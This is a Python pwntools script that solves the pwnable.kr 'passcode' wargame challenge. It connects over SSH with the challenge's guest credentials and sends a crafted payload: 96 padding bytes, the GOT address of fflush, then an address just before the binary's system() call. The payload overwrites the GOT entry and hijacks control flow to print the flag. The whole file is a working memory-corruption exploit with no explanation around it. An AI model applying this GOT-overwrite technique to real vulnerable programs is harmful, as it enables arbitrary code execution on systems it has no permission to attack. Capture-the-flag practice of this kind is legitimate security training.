#!/usr/bin/env python
import pwn

ssh = pwn.ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)
attack = ssh.process(executable='./passcode')

got_fflush = 0x0804a004
addr_before_sys = '134514147'

payload = 96 * 'a'
payload += pwn.p32(got_fflush)
payload += addr_before_sys

print attack.recv()
attack.sendline(payload)
flag = attack.recvall()
print flag